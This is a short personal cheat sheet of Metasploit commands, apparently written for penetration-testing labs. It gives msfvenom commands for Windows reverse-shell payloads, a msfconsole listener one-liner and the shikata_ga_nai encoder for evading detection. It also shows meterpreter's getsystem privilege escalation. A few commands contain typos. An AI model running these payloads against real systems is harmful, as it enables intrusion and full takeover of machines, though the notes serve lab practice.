# Metasploit commands

## Basics

basic msvenom reverse-shell payload:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=${PORT} -f exe -o shell
```

One-liner for setting up a listener
```
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set ${PORT} 6666; set ExitOnSession false; run"
```
Also, keep in mind that it's worth attempting staged payloads if the unstaged one doesn't work (and vise versa).
e.g. when `windows/x64/shell_reverse_tcp` doesn't work, it's worth it to give  `windows/x64/shell/reverse_tcp` a try.
And also give the 32-bit version a try.
I have seen examples of the 64-bit version just not working for some reason.

## encoding

To see encoders available to you, use `msvenom -l encoders`.

Then, you can something like `-e x86/shikata_ga_nai` when creating the payload.

## Session handling

upgrade recent session to meterpreter session: `sessions -u -1`

## controling the output of msfvenom

A lot of the time, we are looking for a file as the payload. eg:
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f python -o shell.py
```

However, if we want to assign the shell to a variable in a script, we can also do that with `-v nameOfVar`, such as:
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f python -v sh
```
which will give us a variable `sh` with the payload as hex. 

## Windows Priv Esc

Using a meterpreter session of from payloads `windows/x64/shell_reverse_tcp` or `windows/shell/reverse_tcp`, you can do this script-kiddie move to privilege escalate:

```
meterpreter > use priv
```
(this might just say `[!] The "priv" extension has already been loaded.`)
```
getsystem
```
and meterpreter will do it's best to get you `NT AUTHORITY\SYSTEM`

